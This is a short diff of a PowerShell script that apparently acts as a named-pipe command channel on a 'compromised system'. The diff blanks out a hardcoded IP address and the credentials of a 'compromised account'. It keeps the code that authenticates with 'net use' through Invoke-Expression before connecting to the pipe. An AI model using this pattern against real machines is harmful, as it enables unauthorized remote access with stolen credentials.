@@ -24,10 +24,10 @@ function ReadCommand ([System.IO.StreamReader]$StreamReader){ #Read Command from
 
 $pipeName = "YahudPipe"
 # Compromised system
-$pipeServer = "192.168.101.13"
+$pipeServer = ""
 # Compromised account
-$username = "HakkYahud"
-$password = "Root*123"
+$username = ""
+$password = ""
 # Authenticate to the server before connecting to the Server pipe
 $auth = "net use \\{0} /user:{1} {2}" -f $pipeServer, $username, $password
 Invoke-Expression -Command $auth
